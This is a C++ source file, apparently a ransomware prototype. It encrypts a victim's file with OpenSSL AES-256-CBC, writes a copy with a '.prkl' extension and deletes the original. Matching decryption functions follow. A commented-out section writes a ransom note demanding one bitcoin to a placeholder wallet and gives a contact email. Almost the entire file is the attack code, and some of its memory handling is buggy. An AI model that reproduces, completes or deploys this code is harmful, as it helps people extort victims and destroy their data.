#include "stdafx.h"
#include <openssl/aes.h>
#include <stdio.h>
#include <stdlib.h>
#include <openssl/evp.h>
#include <string>
#include <iostream>
#include <experimental/filesystem> // C++-standard header file name  
#include <filesystem> // Microsoft-specific implementation header file name 


using namespace std;
using namespace std::experimental::filesystem::v1;


void encryptfile(FILE * fpin, FILE* fpout, unsigned char* key, unsigned char* iv)
{
	//Using openssl EVP to encrypt a file
	const unsigned bufsize = 4096;
	unsigned char* read_buf = (unsigned char*)malloc(bufsize);
	unsigned char* cipher_buf;
	int blocksize;
	int out_len;

	EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();

	EVP_CipherInit(ctx, EVP_aes_256_cbc(), key, iv, 1);
	blocksize = EVP_CIPHER_CTX_block_size(ctx);
	cipher_buf = (unsigned char*)malloc(bufsize + blocksize);

	// read file and write encrypted file until eof
	while (1)
	{
		int bytes_read = fread(read_buf, sizeof(unsigned char), bufsize, fpin);
		EVP_CipherUpdate(ctx, cipher_buf, &out_len, read_buf, bytes_read);
		fwrite(cipher_buf, sizeof(unsigned char), out_len, fpout);
		if (bytes_read < bufsize)
		{
			break;//EOF
		}
	}

	EVP_CipherFinal(ctx, cipher_buf, &out_len);
	fwrite(cipher_buf, sizeof(unsigned char), out_len, fpout);

	free(cipher_buf);
	free(read_buf);
}


void decryptfile(FILE * fpin, FILE* fpout, unsigned char* key, unsigned char* iv)
{
	//Using openssl EVP to encrypt a file
	const unsigned bufsize = 4096; // bytes to read
								   //unsigned char* read_buf = malloc(bufsize); // buffer to hold file text
	unsigned char* read_buf = (unsigned char*)malloc(bufsize);
	unsigned char* cipher_buf;// decrypted text
	int blocksize;
	int out_len;

	EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();

	EVP_CipherInit(ctx, EVP_aes_256_cbc(), key, iv, 0); // 0 = decrypt 	1= encrypt
	blocksize = EVP_CIPHER_CTX_block_size(ctx);
	cipher_buf = (unsigned char*)malloc(bufsize + blocksize);
	//cipher_buf = malloc(bufsize+blocksize);

	// read file and write encrypted file until eof
	while (1)
	{
		int bytes_read = fread(read_buf, sizeof(unsigned char), bufsize, fpin);
		EVP_CipherUpdate(ctx, cipher_buf, &out_len, read_buf, bytes_read);
		fwrite(cipher_buf, sizeof(unsigned char), out_len, fpout);
		if (bytes_read < bufsize)
		{
			break;//EOF
		}
	}

	EVP_CipherFinal(ctx, cipher_buf, &out_len);
	fwrite(cipher_buf, sizeof(unsigned char), out_len, fpout);

	free(cipher_buf);
	free(read_buf);
}

void get_file_encrypt(unsigned char* key, unsigned char* iv, const char* path, const char* file) {
	/*char* full_path_readme = (char*)malloc(strlen("HOW_TO_DECRYPT") + strlen(path) + 2);
	strcpy(full_path_readme, path);
	strcat(full_path_readme, "HOW_TO_DECRYPT.txt");*/
	//create buffer for the file
	char* full_path = (char*)malloc(strlen(path) + strlen(file) + 2);
	//put the path of the directory in the buffer
	strcpy(full_path, path);
	//add the name of the file
	strcat(full_path, file);
	//create buffer for the encrypted file
	char* new_name = (char*)malloc(strlen(full_path) + strlen(".prkl") + 1);
	strcpy(new_name, full_path);
	strcat(new_name, ".prkl");

	FILE* fpin;
	FILE* fpout;
	//FILE* fpreadme;


	fpin = fopen(full_path, "r");
	fpout = fopen(new_name, "w");
	//fpreadme = fopen(full_path_readme, "w");

	//fprintf(fpreadme, "All your files have been encrypted! \n\n The only way to restore them is to follow the next instructions.\n\n 1. Tranfer money to my bitcoin address \n 2. Email me with your bitcoin address that you used to send the money. Then I will email you back with a Decrypter \n\n Send 1BTC now \n My Bitcoin Wallet:this_is_a_bitcoin_wallet\n Email:root@perkele.com \n");
	//fclose(fpreadme);

	encryptfile(fpin, fpout, key, iv);

	fclose(fpin);
	fclose(fpout);
	remove(full_path);

	cout << "========== file encrypted ========\npress enter to continue" << endl;
	cin.ignore();

	free(full_path);
	free(new_name);
}




void get_file_decrypt(unsigned char* key, unsigned char* iv, const char* path, const char* file) {
	/*=============== decrypt the file ============*/
	char* encr_path = (char*)malloc(strlen(path) + strlen(file) + strlen(".prkl"));
	strcpy(encr_path, path);
	strcat(encr_path, file);
	strcat(encr_path, ".prkl");

	char *new_name = (char*)malloc(strlen(encr_path) + 1);
	strcpy(new_name, encr_path);
	new_name[strlen(new_name) - 5] = '\0';

	FILE* fpin;
	FILE* fpout;

	fpin = fopen(encr_path, "r");
	fpout = fopen(new_name, "w");

	decryptfile(fpin, fpout, key, iv);
	if (fpin != NULL)
		fclose(fpin);
	if (fpout != NULL)
		fclose(fpout);

	remove(encr_path);
	//free(encr_path);
	free(new_name);

	cout << "========== file decrypted ========\npress enter to finish" << endl;
	cin.ignore();
}





